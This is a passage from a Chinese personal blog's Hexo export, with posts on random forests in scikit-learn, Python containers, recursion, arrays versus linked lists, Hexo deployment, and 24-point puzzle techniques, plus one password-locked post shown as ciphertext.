M）。2、完全分裂然后对采样之后的数据使用完全分裂的方式建立出决策树，这样决策树的某一个叶子节点要么是无法继续分裂的，要么里面所有样本都是指向的同一个分类。一般很多的决策树算法都一个重要的步骤——剪枝，但是这里不这样干，由于之前的两个随机采样的过程保证了随机性，所以就算不剪枝，也不会出现过拟合。三、随机森林的优缺点1、随机森林的优点两个随机性的引入，使得随机森林不容易陷入过拟合两个随机性的引入，使得随机森林具有很好的抗噪声能力它能够处理很高维度（特征很多）的数据，并且不用做特征选择，对数据集的适应能力强，既能处理离散型数据，也能处理连续型数据，数据集无需规范化可生成一个Proximities=（pij）矩阵，用于度量样本之间的相似性，pij=aij/N, aij表示样本i和j出现在随机森林中同一个叶子结点的次数，N随机森林中树的颗数在创建随机森林的时候，对泛化误差使用的是无偏估计训练速度快，可以得到变量重要性排序（两种：基于OOB误分率的增加量和基于分裂时的GINI下降量）在训练过程中，能够检测到特征间的互相影响训练时树与树之间是相互独立的，容易做成并行化方法实现比较简单2、随机森林的缺点：随机森林在解决回归问题时，并没有像它在分类中表现的那么好，这是因为它并不能给出一个连续的输出。当进行回归时，随机森林不能够做出超越训练集数据范围的预测，这可能导致在某些特定噪声的数据进行建模时出现过度拟合。（PS:随机森林已经被证明在某些噪音较大的分类或者回归问题上回过拟合）。对于许多统计建模者来说，随机森林给人的感觉就像一个黑盒子，你无法控制模型内部的运行。只能在不同的参数和随机种子之间进行尝试。可能有很多相似的决策树，掩盖了真实的结果。对于小数据或者低维数据（特征较少的数据），可能不能产生很好的分类。（处理高维数据，处理特征遗失数据，处理不平衡数据是随机森林的长处）。执行数据虽然比boosting等快（随机森林属于bagging），但比单只决策树慢多了。四、sklearn实现随机森林1、一个简单例子这里我使用scikit-learn中的鸢尾花数据集作为例子来学习随机森林算法。&#123;cmd1234567891011121314151617181920212223242526272829303132333435from sklearn.datasets import load_irisfrom sklearn.model_selection import train_test_splitfrom sklearn.ensemble import RandomForestClassifierimport pandas as pdimport numpy as np# 加载数据集iris = load_iris()# 数据特征：150行， 4列features = iris['data']# 对应的鸢尾花种类: 150个，三种鸢尾花分别用 0,1,2 表示target = iris['target']# 自定义4个特征的名称feature_names = iris.feature_namesfeature_names = ['花萼长度', '花萼宽度', '花瓣长度', '花瓣宽度']# 自定义三种鸢尾花的名称class_names = iris.target_namesclass_names = ['山鸢尾花', '变色鸢尾花', '维吉尼亚鸢尾花']# 把样本分成训练集和测试集两部分, 两者比例为： 7:3X_train, X_test, y_train, y_test = train_test_split(features, target, test_size=0.3, random_state=42)# 定义决策树的个数为100clf = RandomForestClassifier(n_estimators=100) model = clf.fit(X_train, y_train)# 预测output = model.predict(X_test)# 计算准确率acc = np.mean(output == y_test)*100print("The accuracy of the pure RandomForest classifier is: \t", acc, "%")1The accuracy of the pure RandomForest classifier is: 100.0 %下面计算一下特征重要性：&#123;cmd1df_feature = pd.DataFrame(&#123;'feature': feature_names,'importance': model.feature_importances_&#125;)12345 feature importance0 花萼长度 0.1193071 花萼宽度 0.0409932 花瓣长度 0.4589423 花瓣宽度 0.3807582、调参说明n_estimators：表示森林里树的个数。一般来说n_estimators太小，容易欠拟合，n_estimators太大，计算量会太大，并且n_estimators到一定的数量后，再增大n_estimators获得的模型提升会很小，所以一般选择一个适中的数值。默认是100。max_features：最大特征数。一般我们用默认的”auto”就可以了，如果特征数非常多，我们可以灵活使用下面描述的其他取值来控制划分时考虑的最大特征数，以控制决策树的生成时间。默认是”auto”，意味着划分时最多考虑$\sqrt{N}$个特征如果是”log2”，意味着划分时最多考虑$log_2N$个特征如果是”sqrt”，意味着划分时最多考虑$\sqrt{N}$个特征如果是整数，代表考虑的特征绝对数如果是浮点数，代表考虑特征百分比，即考虑（百分比xN）取整后的特征数，其中N为样本总特征数max_depth: 决策树最大深度。默认可以不输入，如果不输入的话，决策树在建立子树的时候不会限制子树的深度。一般来说，数据少或者特征少的时候可以不管这个值。如果模型样本量多，特征也多的情况下，推荐限制这个最大深度，具体的取值取决于数据的分布。常用的可以取值10-100之间。min_samples_split: 内部节点再划分所需最小样本数。这个值限制了子树继续划分的条件，如果某节点的样本数少于min_samples_split，则不会继续再尝试选择最优特征来进行划分。默认是2。如果样本量不大，不需要管这个值。如果样本量数量级非常大，则推荐增大这个值。min_samples_leaf: 叶子节点最少样本数。这个值限制了叶子节点最少的样本数，如果某叶子节点数目小于样本数，则会和兄弟节点一起被剪枝。 默认是1,可以输入最少的样本数的整数，或者最少样本数占样本总数的百分比。如果样本量不大，不需要管这个值。如果样本量数量级非常大，则推荐增大这个值。min_weight_fraction_leaf：叶子节点最小的样本权重和。这个值限制了叶子节点所有样本权重和的最小值，如果小于这个值，则会和兄弟节点一起被剪枝。 默认是0，就是不考虑权重问题。一般来说，如果我们有较多样本有缺失值，或者分类树样本的分布类别偏差很大，就会引入样本权重，这时我们就要注意这个值了。max_leaf_nodes: 最大叶子节点数。通过限制最大叶子节点数，可以防止过拟合，默认是”None”，即不限制最大的叶子节点数。如果加了限制，算法会建立在最大叶子节点数内最优的决策树。如果特征不多，可以不考虑这个值，但是如果特征分成多的话，可以加以限制，具体的值可以通过交叉验证得到。min_impurity_split: 节点划分最小不纯度。这个值限制了决策树的增长，如果某节点的不纯度(基于基尼系数，均方差)小于这个阈值，则该节点不再生成子节点。即为叶子节点。一般不推荐改动默认值1e-7。上面决策树参数中最重要的包括最大特征数max_features， 最大深度max_depth， 内部节点再划分所需最小样本数min_samples_split和叶子节点最少样本数min_samples_leaf。五、参考说说随机森林刘建平Pinard-scikit-learn随机森林调参小结]]></content>
      <categories>
        <category>机器学习</category>
        <category>决策树</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>决策树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python内建容器类型]]></title>
    <url>%2Farchives%2F8a9ed930.html</url>
    <content type="text"><![CDATA[在 Python 中，有四类最常见的内建容器类型：列表（list）、元组（tuple）、字典（dict）、集合（set）。通过单独或是组合使用它们，可以高效的完成很多事情。Python 是一门高级编程语言，它所提供的内置容器类型，都是经过高度封装和抽象后的结果。和“链表”、“红黑树”、“哈希表”这些名字相比，所有 Python 内建类型的名字，都只描述了这个类型的功能特点，其他人完全没法只通过这些名字了解它们的哪怕一丁点内部细节。这是 Python 编程语言的优势之一。相比 C 语言这类更接近计算机底层的编程语言，Python 重新设计并实现了对编程者更友好的内置容器类型，屏蔽掉了内存管理等额外工作。为我们提供了更好的开发体验。列表-list列表的特性：有序的集合通过偏移来索引，从而读取数据支持嵌套可变的类型查找和插入元素的时间随元素增多而变慢，时间复杂度O(n)元组-tuple下面是元组和列表的几个区别。1、元组是不可变的The key difference is that tuples are immutable. This means that you cannot change the values in a tuple once you have created it.最重要的区别：元组是不可变的，而列表是可变的。下面两点是元组的优点。2、大小不同12345a = tuple(range(1000))b = list(range(1000))print(a.__sizeof__()) # 8024print(b.__sizeof__()) # 9088Due to the smaller size of a tuple operation, it becomes a bit faster, but not that much to mention about until you have a huge number of elements.由于元组支持的操作比列表小， 所以元组会比列表稍稍快上那么一丢丢。但是除非你有巨量的数据要去处理，否者这一点不需要特别强调。3、元组可以作为字典的keyYou can’t use list as a dictionary identifier.你不能将列表当作字典的key，而元组可以（因为元组是不可变的）。12345a = (1,2)b = [1,2] c = &#123;a: 1&#125; # OKc = &#123;b: 1&#125; # Error (TypeError: unhashable type: 'list')字典-dict下面是字典的几个特点。1、查找速度快无论dict有10个元素还是10万个元素，查找速度都一样。而list的查找速度随着元素增加而逐渐下降。不过dict的查找速度快不是没有代价的，dict的缺点是占用内存大，还会浪费很多内容，list正好相反，占用内存小，但是查找速度慢。由于dict是按 key 查找，所以，在一个dict中，key不能重复。2、存储的key-value序对没有顺序这一点和list不一样。当我们打印下面这个dict会得到：1234567d = &#123; 'Adam': 95, 'Lisa': 85, 'Bart': 59&#125;print(d)1&#123;&apos;Lisa&apos;: 85, &apos;Adam&apos;: 95, &apos;Bart&apos;: 59&#125;打印的顺序不一定是我们创建时的顺序，而且，不同的机器打印的顺序都可能不同，这说明dict内部是无序的，不能用dict存储有序的集合。3、作为 key 的元素必须不可变Python的基本类型如字符串、整数、浮点数都是不可变的，都可以作为 key。但是list是可变的，就不能作为 key。不可变这个限制仅作用于key，value是否可变是无所谓的：12345&#123; '123': [1, 2, 3], # key 是 str，value是list 123: '123', # key 是 int，value 是 str ('a', 'b'): True # key 是 tuple，并且tuple的每个元素都是不可变对象，value是 boolean&#125;最常用的key还是字符串，因为用起来最方便。集合-setdict的作用是建立一组 key 和一组 value 的映射关系，dict的key是不能重复的。有的时候，我们只想要 dict 的 key，不关心 key 对应的 value，目的就是保证这个集合的元素不会重复，这时，set就派上用场了。set 持有一系列元素，这一点和 list 很像，但是set的元素没有重复，而且是无序的，这点和 dict 的 key很像。set的特点：set的内部结构和dict很像，唯一区别是不存储value，因此，判断一个元素是否在set中速度很快。set存储的元素和dict的key类似，必须是不变对象，因此，任何可变对象是不能放入set中的。set存储的元素也是没有顺序的。set不能包含重复的元素（set会自动去掉重复的元素）。参考Python 工匠：容器的门道Python 中列表和元组有哪些区别？What’s the difference between lists and tuples?Python中dict与set的对比]]></content>
      <categories>
        <category>Python</category>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解递归]]></title>
    <url>%2Farchives%2F98f0aad7.html</url>
    <content type="text"><![CDATA[递归是很多算法都使用的一种编程方法。递归的思想以此类推是递归的基本思想。具体来讲就是把规模大的问题转化为规模小的相似的子问题来解决。在函数实现时，因为解决大问题的方法和解决小问题的方法往往是同一个方法，所以就产生了函数调用它自身的情况。另外这个解决问题的函数必须有明显的结束条件，这样就不会产生无限递归的情况了。递归的两个条件编写递归函数时，必须告诉它何时停止递归。正因为如此，每个递归函数都有两部分：基线条件（base case）和递归条件（recursive case）。递归条件指的是函数调用自己，而基线条件则指的是函数不再调用自己，从而避免形成无限循环。123456def countdown(i): print(i) if i &lt;= 0: return else: countdown(i-1)其中 i &lt;= 0 就是基线条件，而 else 是递归条件。递归的过程在求解6的阶乘时，递归过程如下所示。我们会惊奇的发现这个过程和栈的工作原理一致对，递归调用就是通过栈这种数据结构完成的。整个过程实际上就是一个栈的入栈和出栈问题。然而我们并不需要关心这个栈的实现，这个过程是由系统来完成的。其中递归中的“递”就是入栈，递进；“归”就是出栈，回归。下面是其Python实现：1234567def fib(self,n): if n == 1: return 1 elif n == 2: return 1 else: return fib(n-1)+fib(n-2)参考深入理解递归]]></content>
      <categories>
        <category>计算机基础</category>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数组和链表的区别]]></title>
    <url>%2Farchives%2F5c8792e.html</url>
    <content type="text"><![CDATA[数组：内存上是连续的存储空间；链表：内存地址可以是不连续的，每个链表的节点包括原来的内存和下一节点的信息（单向链表一个；双向链表两个）。数组、链表优劣势对比读取元素当我们需要读取元素时，数组和链表哪个更好呢？链表：在读取链表的最后一个元素时，你不能直接读取，因为你不知道它所处的地址，必须先访问元素#1，从中获取元素#2的地址，再访问元素#2并从中获取元素#3的地址，以此类推，直到访问最后一个元素。数组：知道其中每个元素的地址。因此数组的效率很高，可迅速找到数组中的任何元素。插入元素当我们需要在中间插入元素时，数组和链表哪个更好呢？链表：插入元素很简单，只需修改它前面的那个元素指向的地址。数组：必须将后面的元素都向后移。如果没有足够的空间，可能还得将整个数组复制到其他地方！删除元素当我们需要删除元素时，数组和链表哪个更好呢？链表：只需修改前一个元素指向的地址即可。数组：删除元素后，必须将后面的元素都向前移。不同于插入，删除元素总能成功。如果内存中没有足够的空间，插入操作可能失败，但在任何情况下都能够将元素删除。总结下面是数组和链表的不同操作的时间复杂度：数组链表读取O(1)O(n)插入O(n)O(1)删除O(n)O(1)《算法图解》读书笔记]]></content>
      <categories>
        <category>计算机基础</category>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo搭建个人博客文章汇总]]></title>
    <url>%2Farchives%2Faad98408.html</url>
    <content type="text"><![CDATA[Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。1、Hexo建站首先我们可以在GitHub Pages上搭建个人博客。具体过程见下文：Hexo建站教程2、Hexo部署到VPS搭建完博客后，我们需要进行搜索引擎优化（SEO）。现在我们的博客是托管在GitHub Pages上，但是GitHub屏蔽了百度的爬虫，对于中文网站来说，百度带来的流量是非常可观的，因此，我需要一个办法让百度收录我的博客。这里一个比较简单的办法就是把Hexo博客部署到自己的VPS上。第一步：购买个性域名这里我推荐Namesilo这个平台，价格比较便宜，而且提供免费的域名隐私保护。具体过程见下文：GitHub Pages绑定域名第二步：部署到VPS我们将 Hexo 在本地通过 hexo generate 生成静态文件，在通过 hexo deploy 部署到 VPS 上面，使用 Nginx 直接做 Web 服务器。这里我使用的是Git Hooks进行自动部署。部署原理：我们在本地编辑文本，然后使用 Git 远程部署到 VPS 的 Git 仓库。hexo d 命令实际上只 deploy 了本地的 public 文件夹，Git Hooks 实际上就是当 Git 仓库收到最新的 push 时，将 Git 仓库接受到的内容复制到 VPS 上的网站目录内。相当于完成了手动将 public 文件夹复制到 VPS 的网站根目录里。具体过程见下文：Hexo博客部署到VPS注意：现在需要我们修改下DNSPod的解析地址，把域名解析到VPS的IP地址而不是GitHub的IP地址。第三步：免费升级HTTPS为了鼓励 https 的普及，EFF 成立了免费证书最大的提供商为 Let’s Encrypt，可以提供免费证书。具体过程见下文：Hexo 升级 HTTPS第四步：提交搜索引擎收录通过上面三步，我们已经完成了Hexo在VPS上的部署并且开启了HTTPS，下面我们只需要注册一个百度站长账号，然后提交sitemap，静等百度收录我们的个人网站。具体过程见下文：Hexo-NexT 博客提交搜索引擎收录3、Hexo双线部署在GitHub Pages和Coding Pages下面是双线部署的过程：Hexo 博客部署到 Coding完成双线部署后，境外访问就会走 GitHub，境内就会走 Coding，大大提升了访问速度。4、Hexo博客部署在GitHub Pages上并且配置CDN进行加速由于Coding Pages的服务并不是那么稳定，近期出现多次不能正常部署或访问Pages的问题，所以我现在采用了博客部署在GitHub Pages上并且配置CDN进行加速的方法。国内的CDN服务提供商有不少，但是基本都需要备案，因此我用了Cloudflare这个国外的CDN服务提供商。配置CDN的过程见：Hexo配置Cloudflare免费CDN5、Hexo主题选择Hexo有很多简洁美观的主题，大家可以去Hexo-Themes去选择自己喜欢的主题。我使用过Yilia和NexT这两款主题，下面是我美化过程的一个记录。Hexo NexT主题美化基本配置下面是NexT主题的基本配置以及内置的Tag插件使用说明：Hexo-NexT(v7.0+)主题配置Hexo-NexT Tag 插件的使用自定义子页面NexT主题自带的子页面很少，只有首页、标签、分类、归档、关于等子页面。为了记录更多的内容，我添加了豆瓣读书、豆瓣电影、画廊、热榜等子页面，具体过程以及效果见下面：Hexo加入豆瓣读书页面具体效果见：小丁的个人博客-豆瓣电影Hexo-NexT实现相册具体效果见：小丁的个人博客-画廊Hexo-NexT新增阅读排行页面具体效果见：小丁的个人博客-热榜第三方服务配置有一些服务，包括评论、在线聊天、文章评分、分享等功能无法通过静态页面实现，所以我用了第三方服务商提供上述服务，具体配置过程如下：Hexo-NexT 添加第三方服务由于Disqus这个评论服务需要科学上网才能使用，不利于交流，因此我换用了Valine，配置过程如下：Hexo-NexT 配置 Valine有时候，我们想要在个人博客的“关于”栏目下展示自己的GitHub Chart，如下图所示：具体设置过程可以见：Hexo 博客展示 GitHub Chart自定义样式下面是一些自定义样式美化：Hexo-NexT 设置博客背景图片Hexo-NexT 增加 canvas 粒子时钟Hexo Yilia主题美化Hexo-Yilia进阶笔记我的个人博客地址：小丁的个人博客]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>GitHub Pages</tag>
        <tag>NexT</tag>
        <tag>Yilia</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[24点解题技巧]]></title>
    <url>%2Farchives%2F384ceeb9.html</url>
    <content type="text"><![CDATA[24点，以其简洁的规则、无穷的变化深受大家的喜爱，甚至有网友感叹：很难想象念过书的人会没有算过或见过或听说过24点。虽然大多数人都没有对24点做过深入的研究，但只要懂得加、减、乘、除四则运算，大多数题目还是能迎刃而解。难题破解技巧事实上，确实有少量的难题，用常规的思路无法解出，但正是这些难题，成就了24点的魅力。所谓的难题，就是指计算过程中出现分数（小数）的算式，以1～10数字算24为例，将会出现以下四种情况（A、B、C、D分别表示四个数）。（A÷B＋C）×D 例：（10÷7＋2）×7＝24（A－B÷C）×D 例：（5－1÷5）×5＝24A÷（B÷C－D） 例：4÷（7÷6－1）＝24A÷（B－C÷D） 例：6÷（1－3÷4）＝24倘若我们对题目的四个数，用常规思路确实无法算出24点时，就要考虑用上述四个公式，看看那个公式适合，相信会很快找到答案。几个经典例题1、3、4、6点击显/隐内容6 / (1 - 3/4) =241、5、5、5点击显/隐内容(5 - 1/5) * 5 =242、2、2、9点击显/隐内容(2 + 9) * 2 + 2 =243、3、7、7点击显/隐内容(3 + 3/7) * 7 =243、3、8、8点击显/隐内容8 / (3 - 8/3)=244、4、7、7点击显/隐内容(4 - 4/7) * 7 = 244、4、10、10点击显/隐内容(10 * 10 - 4) / 4 = 24参考24点难题破解技巧]]></content>
      <categories>
        <category>思维</category>
        <category>24点</category>
      </categories>
      <tags>
        <tag>24点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信号与系统基础知识]]></title>
    <url>%2Farchives%2Fa4f70622.html</url>
    <content type="text"><![CDATA[请输入密码 Incorrect Password! No content to display! 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